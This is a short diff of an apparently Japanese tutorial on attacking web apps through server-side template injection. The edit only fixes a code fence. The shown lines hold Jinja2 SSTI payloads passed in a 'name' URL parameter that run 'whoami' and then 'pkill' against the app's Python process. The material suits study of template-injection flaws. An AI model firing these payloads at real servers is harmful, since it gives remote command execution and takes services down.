@@ -108,7 +108,8 @@ SSTIでWEBアプリへの攻撃を行う
 1回目のリクエスト
 
 ```
-/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}```
+/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}
+```
 
 ```
 /app?name={{request.application.__globals__.__builtins__.__import__("os").popen("pkill -f 'python3 /var/www/html/webapp/app.py'").read()}}
